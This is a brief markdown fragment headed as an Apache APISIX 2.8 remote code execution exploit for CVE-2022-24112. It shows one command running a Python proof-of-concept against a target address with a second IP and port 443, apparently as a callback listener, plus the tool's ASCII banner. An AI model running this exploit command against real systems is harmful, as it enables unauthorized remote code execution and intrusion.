# Apache APISIX/2.8 - RCE (CVE-2022-24112)

```bash
python3 poc/poc.py http://192.168.247.220:43500/ 192.168.45.158 443

  _.._ * __*\./ ___  _ \./._ | _ *-+-

                                   .     ,
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |
          |                     |

                (CVE-2022-24112)
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }
```
